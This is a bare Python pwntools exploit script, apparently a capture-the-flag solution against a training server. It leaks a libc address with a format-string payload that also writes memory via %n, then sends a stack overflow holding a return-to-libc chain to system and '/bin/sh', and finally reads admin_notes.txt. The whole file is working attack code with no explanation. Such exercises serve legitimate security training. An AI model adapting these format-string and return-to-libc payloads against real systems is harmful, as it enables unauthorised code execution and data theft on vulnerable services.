from pwn import *

system=0x4cd10
bzero=0x95820
binsh=0x18b8cf
r=connect("stack-diving.tasks.cyberschool.msu.ru", 31339)
r.recvuntil('>')
r.sendline("admin%19$p%23032005d%47$n")
r.recvuntil('0x')
libc_base= int(r.recv(8),16) - bzero - 0x9fcc
print("base:"+hex(libc_base))
r.recvuntil('>')
r.sendline("change_password")
r.recvuntil(">")
r.sendline("23032020")
r.recvuntil(">")
pas=b'a'*52+p32(libc_base+system)+b'aaaa'+p32(libc_base+binsh)
r.sendline(pas)
r.recvuntil(">")
r.sendline(pas)
r.recvuntil(">")
r.sendline("y")
r.recvuntil("successfully")
r.sendline("cat admin_notes.txt")
print(r.recvall())